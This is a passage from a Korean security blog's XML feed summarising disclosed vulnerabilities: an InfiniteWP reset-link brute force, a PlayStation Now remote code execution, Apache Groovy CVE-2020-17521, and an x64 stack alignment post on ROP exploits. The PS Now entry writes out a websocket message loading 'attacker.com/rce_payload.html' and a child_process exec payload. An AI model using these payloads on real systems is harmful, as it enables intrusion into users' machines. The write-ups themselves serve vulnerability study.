&#xC218; &#xC788;&#xB2E4;&#xBA74; &#xB204;&#xAD6C;&#xB098; &#xC720;&#xD6A8;&#xD55C; &#xB9C1;&#xD06C;&#xB97C; &#xD0C0;&#xACE0; &#xC6D0;&#xD558;&#xB294; &#xC720;&#xC800;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>userID<ul><li>auto-increment integer&#xC785;&#xB2C8;&#xB2E4;. manage-user&#xB77C;&#xB294; &#xC720;&#xB8CC; addon&#xC744; &#xAD6C;&#xB9E4;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xBA74; &#xAE30;&#xBCF8;&#xAC12;&#xC774; 1&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li>email<ul><li>&#xAC00;&#xC785;&#xB418;&#xC9C0; &#xC54A;&#xC740; email &#xC8FC;&#xC18C;&#xB77C;&#xBA74; <code>login.php?view=resetPassword&amp;errorMsg=resetPasswordEmailNotFound</code>&#xB85C; redirect &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; Infinite WP&#xC5D0; &#xAC00;&#xC785;&#xB41C; email&#xC778;&#xC9C0; &#xD310;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>microtime(true)<ul><li>microtime(true)&#xC758; &#xAC12;&#xC740; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC7AC;&#xC124;&#xC815; &#xB9C1;&#xD06C;&#xAC00; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C8; &#xB54C;&#xC758; Unix timestamp&#xC785;&#xB2C8;&#xB2E4;. Http date &#xD574;&#xB354; &#xAC12;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC720;&#xCD94;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#xC0DD;&#xC131;&#xB41C; &#xB9C1;&#xD06C;&#xB294; 24&#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xC720;&#xD6A8;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xAC1C;&#xB41C; POC&#xB294; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xC138; &#xAC12;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2F1; &#xACF5;&#xACA9;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA70; &#xD3C9;&#xADE0; 1&#xC2DC;&#xAC04; &#xB0B4;&#xC678;&#xB85C; &#xC720;&#xD6A8;&#xD55C; &#xB9C1;&#xD06C;&#xB97C; &#xCC3E;&#xC544;&#xB0C5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Remote Code Execution in PlayStation Now</title>
    <link href="/2020/12/08/l0ch/2020-12-08/"/>
    <url>/2020/12/08/l0ch/2020-12-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/873614">RCE in PlayStation Now</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PlayStation Now &#x2264; 11.0.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xAC8C;&#xC784; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xC11C;&#xBE44;&#xC2A4; PlayStation Now&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.<br><br><br>PS Now&#xC758; &#xC8FC;&#xC694; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xB85C;&#xB294; QAS&#xC640; AGL&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. QAS&#xB294; Qt5 &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C; &#xAC1C;&#xBC1C;&#xB41C;  <code>psnowlauncher.exe</code> &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC774;&#xBA70; PS Now&#xC758; &#xBA54;&#xC778; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC785;&#xB2C8;&#xB2E4;.  AGL&#xC740; Electron &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xBA70; QAS&#xC5D0; &#xC758;&#xD574; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C; &#xB85C;&#xB4DC;&#xD560; &#xD398;&#xC774;&#xC9C0;&#xC758; URL&#xC744; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xBC1B;&#xC544; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.<br><br><br><code>nodeIntegration</code>&#xC740; <code>Electron BrowserWindows</code>&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; javascript&#xC5D0;&#xC11C; Windows &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xAC12;&#xC740; false&#xC9C0;&#xB9CC; AGL&#xC5D0;&#xC11C;&#xB294; true&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70;, AGL&#xC740; &#xB85C;&#xB4DC;&#xD558;&#xB294; URL &#xAC80;&#xC99D;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xB2F4;&#xAE34; URL&#xC744; &#xD1B5;&#xD574; javascript&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><br><br>&#xC774; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC740; QAS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB85C;&#xCEEC; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xAC00; &#xB2E4;&#xC74C; request&#xB97C; &#xB85C;&#xCEEC; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84;&#xC5D0; &#xBCF4;&#xB0B4;&#xBA74; AGL&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; URL&#xC744; QAS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs json">{  <span class="hljs-attr">&quot;command&quot;</span>: <span class="hljs-string">&quot;setUrl&quot;</span>,  <span class="hljs-attr">&quot;params&quot;</span>: {    <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://normal_url.com&quot;</span>  },  <span class="hljs-attr">&quot;source&quot;</span>: <span class="hljs-string">&quot;AGL&quot;</span>,  <span class="hljs-attr">&quot;target&quot;</span>: <span class="hljs-string">&quot;QAS&quot;</span>}</code></pre><p>&#xADF8;&#xB7EC;&#xB098; source&#xC640; target&#xC744; &#xBC14;&#xAFD4; URL&#xC744; AGL&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD558;&#xBA74; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; AGL&#xC774; &#xB85C;&#xB4DC;&#xD560; URL&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><br><br>&#xD53C;&#xD574;&#xC790;&#xC758; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; PS Now&#xC640; QAS, &#xB85C;&#xCEEC; &#xC6F9; &#xC18C;&#xCF13;&#xC774; &#xC2E4;&#xD589; &#xC911;&#xC77C; &#xACBD;&#xC6B0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB85C; &#xD574;&#xCEE4;&#xC758; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC811;&#xC18D;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC6F9; &#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xD53C;&#xD574;&#xC790; PC&#xC758; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84; <code>ws://localhost:1235</code> &#xC5D0; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;.</li><li><p>&#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xC6F9; &#xC18C;&#xCF13; &#xC11C;&#xBC84;&#xC5D0; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. </p> <pre><code class="hljs json">{<span class="hljs-attr">&quot;command&quot;</span>:<span class="hljs-string">&quot;setUrl&quot;</span>,<span class="hljs-attr">&quot;params&quot;</span>:{<span class="hljs-attr">&quot;url&quot;</span>:<span class="hljs-string">&quot;https://attacker.com/rce_payload.html&quot;</span>},<span class="hljs-attr">&quot;source&quot;</span>:<span class="hljs-string">&quot;QAS&quot;</span>,<span class="hljs-attr">&quot;target&quot;</span>:<span class="hljs-string">&quot;AGL&quot;</span>}</code></pre></li><li><p>AGL&#xC740; <code>https://attacker.com/rce_payload.html</code> &#xB97C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>rce_payload.html</code>&#xC758; javascript &#xCF54;&#xB4DC;&#xAC00; &#xD53C;&#xD574;&#xC790;&#xC758; PC&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs jsx"><span class="hljs-comment">// rce_payload.html</span>&lt;html&gt;    &lt;head&gt;        &lt;title&gt;PS Now RCE&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;child_process&apos;</span>)            .exec(<span class="hljs-string">&apos;calc&apos;</span>)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>playstation</tag>
      
      <tag>remote code execution</tag>
      
      <tag>playstation now</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17521: Apache Groovy Information Disclosure</title>
    <link href="/2020/12/07/idioth/2020-12-07/"/>
    <url>/2020/12/07/idioth/2020-12-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2020/q4/183">https://seclists.org/oss-sec/2020/q4/183</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Unsupported Codehaus version of Groovy from 2.0 to 2.4.4.</li><li>Apache Groovy versions 2.4.4 to 2.4.20 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1.</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache Groovy&#xC5D0;&#xC11C; <code>createTempDir</code> method&#xB85C; &#xC778;&#xD55C; Local Privilege Escalation&#xACFC; Information Disclosure&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC720;&#xB2C9;&#xC2A4; &#xAE30;&#xBC18; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC640; Mac OSX, Windows&#xC758; &#xC61B;&#xB0A0; &#xBC84;&#xC804;&#xC774; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB178;&#xCD9C;&#xB418;&#xB294; &#xC870;&#xAC74;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC5D0;&#xC11C; Groovy code&#xAC00; &#xB3D9;&#xC791;</li><li>&#xB2E4;&#xB978; &#xC720;&#xC800;&#xAC00; Groovy code&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC74C;</li><li><code>createTempDir</code> extension method&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC2DC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC0DD;&#xC131;</li></ul><p>Groovy&#xB294; &#xBAA8;&#xB4E0; &#xC720;&#xC800;&#xAC00; &#xACF5;&#xC720;&#xD560; &#xC218; &#xC788;&#xB294; OS &#xC784;&#xC2DC; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xB0B4;&#xC5D0; &#xC784;&#xC2DC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Groovy&#xC5D0;&#xC11C; <code>createTempDir</code> method&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; java stub&#xC744; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xAC70;&#xB098; user code&#xB97C; &#xB300;&#xC2E0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC784;&#xC2DC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. Groovy user code&#xAC00; <code>createTempDir</code> method&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC784;&#xC2DC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xBA74; Local Privilege Escalation&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC784;&#xC2DC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;&#xBA74; &#xC815;&#xBCF4;&#xAC00; &#xB178;&#xCD9C;&#xB418;&#xAC70;&#xB098; &#xC218;&#xC815;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC218;&#xC815;&#xB41C; Groovy 2.5 &#xC774;&#xC0C1; &#xBC84;&#xC804;&#xACFC; JDK 7 &#xC774;&#xC0C1;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; Groovy 2.4&#xC5D0;&#xC11C;&#xB294; Groovy Code&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB9CC; &#xC77D;&#xC744; &#xC218; &#xC788;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; JDK method&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xBC29;&#xBC95;&#xC740; Local Privilege Escalation&#xC740; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC9C0;&#xB9CC; Information Disclosure&#xB294; &#xB9C9;&#xC744; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC2DC;&#xC2A4;&#xD15C; &#xD658;&#xACBD; &#xBCC0;&#xC218; <code>java.io.tmpdir</code>&#xB97C; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xACE0;&#xC720; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xC124;&#xC815;&#xD558;&#xBA74; &#xBAA8;&#xB4E0; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC640; Groovy &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD574;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;. &#xD639;&#xC740; Groovy extension method &#xB300;&#xC2E0; JDK&#xC758; <code>Files#createTempDirectory</code> method&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC29;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>information disclosure</tag>
      
      <tag>apache</tag>
      
      <tag>idioth</tag>
      
      <tag>groovy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] x64 stack alignment</title>
    <link href="/2020/12/06/fabu1ous/x64-stack-alignment/"/>
    <url>/2020/12/06/fabu1ous/x64-stack-alignment/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png" alt></p><p>&#xBE44;&#xBC00; &#xD504;&#xB85C;&#xC81D;&#xD2B8;( &#xC544;&#xC9C1; &#xBE44;&#xBC00;, &#xC27F;! ) &#xB54C;&#xBB38;&#xC5D0; Ubuntu 20.04&#xC5D0;&#xC11C; &#xBA87; &#xAC00;&#xC9C0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD558;&#xB2E4;&#xAC00; &#xCC98;&#xC74C; &#xBCF4;&#xB294; &#xC5D0;&#xB7EC;&#xC5D0; &#xB2F9;&#xD669;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <code>do_system+364: movaps</code> &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC5D0;&#xC11C; Segmentation Fault&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xACE0;&#xC694;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png" alt></p><p>&#xC54C;&#xC544;&#xBCF4;&#xB2C8;&#xAE4C; Ubuntu 18.04&#xBD80;&#xD130; <code>do_system()</code>&#xC5D0; <code>movaps</code>&#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; &#xD558;&#xB098; &#xCD94;&#xAC00;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC870;&#xAE08; &#xB4A4;&#xC5D0; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC9C0;&#xB9CC;, x64 &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC120; 16&#xBC14;&#xC774;&#xD2B8;&#xB85C; stack alignment&#xB97C; &#xC9C0;&#xCF1C;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. stack alignment&#xAC00; &#xAE68;&#xC838;&#xC788;&#xC73C;&#xBA74; &#xC774; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB2E4; Segmentation Fault&#xAC00; &#xB739;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB188; &#xB54C;&#xBB38;&#xC5D0; 18.04 &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC775;&#xC2A4; &#xB418;&#xB294; BOF &#xACF5;&#xACA9;&#xCF54;&#xB4DC;&#xAC00; 18.04 &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png" alt></p><p><em>&#x6545; Fabu1ous&#xC758; &#xB124;&#xC774;&#xBC84; &#xBE14;&#xB85C;&#xADF8; (2018.10 ~ 2019.12)</em></p><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xD47C; &#xD3EC;&#xB108;&#xBE14; &#xBB38;&#xC81C;&#xB9CC; &#xBC31;&#xBA87; &#xAC1C;&#xCBE4; &#xB418;&#xACE0; &#xC218;&#xC5C6;&#xC774; &#xB9CE;&#xC740; <code>system(&quot;/bin/sh&quot;)</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xBD24;&#xB294;&#xB370; &#xC5B4;&#xC9F8;&#xC11C; &#xC774; &#xC0AC;&#xC2E4;&#xC744; &#xC774;&#xC81C;&#xC57C; &#xC54C;&#xAC8C; &#xB41C; &#xAC70;&#xC9C0;?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png" alt></p><p>&#xC791;&#xB144;(2019) &#xD06C;&#xB9AC;&#xC2A4;&#xB9C8;&#xC2A4; CTF&#xC5D0;&#xC11C; &#xB2E8;&#xC21C; ROP&#xBB38;&#xC81C;&#xB97C; &#xC775;&#xC2A4; &#xBABB;&#xD574;&#xC11C; &#xD654;&#xB0AC;&#xB358; &#xAE30;&#xC5B5;&#xC774; &#xBA38;&#xB9AC;&#xB97C; &#xC2A4;&#xCE58;&#xACE0; &#xC9C0;&#xB098;&#xAC14;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD84;&#xBA85; &#xB85C;&#xCEEC;&#xC5D0;&#xC120; &#xC775;&#xC2A4;&#xAC00; &#xB418;&#xB358; &#xAC8C; &#xB9AC;&#xBAA8;&#xD2B8; &#xC775;&#xC2A4;&#xAC00; &#xC548;&#xB3FC;&#xC11C; &#xD300;&#xC6D0;&#xC5D0;&#xAC8C; &#xCF54;&#xB4DC;&#xB97C; &#xB118;&#xACA8;&#xC8FC;&#xACE0; &#xB2E4;&#xB978; &#xBB38;&#xC81C; &#xBCF4;&#xB7EC; &#xAC14;&#xC5C8;&#xC8E0;. &#xADF8;&#xB54C; &#xBABB; &#xD480;&#xC5C8;&#xB358; ROP&#xBB38;&#xC81C;&#xB294; solo_test&#xB780; &#xBB38;&#xC81C;&#xC600;&#xB294;&#xB370; &#xADF8;&#xB54C; &#xB85C;&#xCEEC; &#xD658;&#xACBD;&#xC774; &#xC6B0;&#xBD84;&#xD22C; 16.04&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xD6C4;&#x2026;</p><p>&#xB300;&#xD68C; &#xB05D;&#xB098;&#xACE0; &#xBC14;&#xB85C; &#xBA70;&#xCE60; &#xB4A4;&#xC5D0; &#xC774; &#xC8FC;&#xC81C;&#xC5D0; &#xB300;&#xD55C; &#xB77C;&#xC5C5;&#xC774; &#xD558;&#xB098; &#xC62C;&#xB77C;&#xC654;&#xB294;&#xB370; 1&#xB144;&#xC774; &#xC9C0;&#xB09C; &#xC9C0;&#xAE08;&#xC5D0;&#xC11C;&#xC57C; &#xCC3E;&#xC544;&#xBCF8; &#xC81C; &#xC790;&#xC2E0;&#xC774; &#xB108;&#xBB34; &#xBC09;&#xB124;&#xC694;. ROP&#xBB38;&#xC81C;&#xB77C;&#xACE0; &#xB300;&#xC218;&#xB86D;&#xC9C0; &#xC54A;&#xAC8C; &#xADF8;&#xB0E5; &#xB118;&#xACA8;&#xBC84;&#xB9B0; &#xAC83;&#xC5D0; &#xBC18;&#xC131;&#xD558;&#xBA70; &#xC9C0;&#xAE08;&#xC774;&#xB77C;&#xB3C4; &#xACF5;&#xBD80;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><blockquote><p>&#xB2A6;&#xC5C8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD560; &#xB54C;&#xAC00; &#xC9C4;&#xC9DC; &#xB108;&#xBB34; &#xB2A6;&#xC5C8;&#xB2E4; -&#xBC15;&#xBA85;&#xC218;-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment&#xB294; stack&#xC758; top&#xC774; 16&#xC758; &#xBC30;&#xC218;&#xB85C; &#xC720;&#xC9C0;&#xB41C; &#xC0C1;&#xD0DC;&#xBA70; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; access cycle&#xC744; &#xCD5C;&#xC18C;&#xD55C;&#xC73C;&#xB85C; &#xC904;&#xC774;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. ( CS&#xB97C; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xAC00; &#x201C;&#xC65C;?&#x201D;&#xB77C;&#xB294; &#xC9C8;&#xBB38;&#xC744; &#xB358;&#xC9C0;&#xBA74; &#xC2ED;&#xC911;&#xD314;&#xAD6C; &#x201C;&#xD6A8;&#xC728;&#x201D;&#xC774;&#xB77C;&#xB294; &#xB300;&#xB2F5;&#xC774; &#xB3CC;&#xC544;&#xC634;, &#xB354; &#xC790;&#xC138;&#xD55C; &#xAC74; &#xC9C1;&#xC811; &#xCC3E;&#xC544;&#xBCF4;&#xC2DC;&#xAE38; ) &#xADF8;&#xB9AC;&#xACE0; &#xC774; stack alignment&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; RSP&#xC758; &#xC704;&#xCE58;&#xAC00; &#xC815;&#xD574;&#xC9C0;&#xB294; &#xADDC;&#xCE59;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png" alt></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;( control )&#xC774; &#xD568;&#xC218;&#xC758; entry&#xB85C; &#xC62E;&#xACA8;&#xC9C0;&#xB294; &#xC2DC;&#xC810;&#xC5D0;&#xC120; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;(rsp)+8&#xC774; &#xD56D;&#xC0C1; 16&#xC758; &#xBC30;&#xC218;&#xC5EC;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png" alt></p><p>&#xBC29;&#xAE08; &#xC804;&#xC5D4; RSP&#xB97C; 16&#xC758; &#xBC30;&#xC218;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB294; &#xAC8C; stack alignment&#xB77C; &#xD574;&#xB193;&#xACE0; &#xAC11;&#xC790;&#xAE30; RSP+8&#xC774; 16&#xC758; &#xBC30;&#xC218;&#xB77C;&#xB2C8;, &#xBB50;&#xB77C;&#xB294; &#xAC70;&#xC57C;?</p><p>&#xBB34;&#xC2A8; &#xC18C;&#xB9B0;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xC8E0;? &#xC124;&#xBA85;&#xC774; &#xBB50; &#xAC19;&#xC774; &#xC4F0;&#xC5EC;&#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xB807;&#xC9C0; &#xC0AC;&#xC2E4; &#xC544;&#xC8FC; 